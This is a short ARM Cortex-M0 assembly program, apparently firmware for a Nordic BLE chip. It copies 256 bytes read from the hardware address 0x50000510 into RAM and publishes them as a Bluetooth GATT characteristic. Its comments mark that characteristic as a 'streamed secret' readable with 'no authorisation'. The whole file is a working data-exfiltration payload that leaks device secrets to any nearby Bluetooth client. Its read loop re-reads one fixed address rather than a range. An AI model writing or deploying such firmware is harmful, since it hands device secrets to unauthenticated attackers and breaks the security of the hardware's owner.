.syntax unified
.cpu cortex-m0
.thumb
.section .text,"ax",%progbits
.global _start
_start:
  .word 0x20007f00
  .word main
.thumb_func
main:
  ldr r0, =0x50000510
  ldr r1, =0x20001000
  movs r2, #64                  @ 64 32-bit reads -> 256 bytes
1:
  ldr r3, [r0]
  str r3, [r1]
  adds r1, #4
  subs r2, #1
  bne 1b

  ldr r0, =vendor_base
  ldr r1, =vendor_type
  svc #0x63

  ldr r0, =vendor_type
  ldrb r0, [r0]
  ldr r1, =service_uuid
  strb r0, [r1, #2]
  ldr r1, =char_uuid
  strb r0, [r1, #2]

  movs r0, #1
  ldr r1, =service_uuid
  ldr r2, =service_handle
  svc #0xa0

  ldr r0, =service_handle
  ldrh r0, [r0]
  ldr r1, =char_md
  ldr r2, =char_attr
  ldr r3, =char_handles
  svc #0xa2
2:
  b 2b

.align 2
vendor_base:
   .byte 0x22,0x44,0x66,0x88,0xaa,0xcc,0xee,0xf0,0x00,0x11,0x22,0x33,0x00,0x00,0x55,0x66
service_uuid:
   .hword 0x1234
   .byte 0,0
char_uuid:
   .hword 0x1235
   .byte 0,0
vendor_type:
   .byte 0,0,0,0
service_handle:
   .hword 0,0
char_handles:
   .space 8,0
char_md:
   .byte 0x02                @ READ property
   .space 7,0
attr_md:
   .byte 1,0,0,0           @ readable, not writable, no authorisation
char_attr:
   .word char_uuid          @ uuid pointer
   .word attr_md            @ attribute metadata ptr
   .hword 256               @ initial data length
   .hword 0                 @ init offset
   .hword 256               @ maximum data length
   .hword 0
   .word 0x20001000         @ streamed secret
.align 2
.ltorg
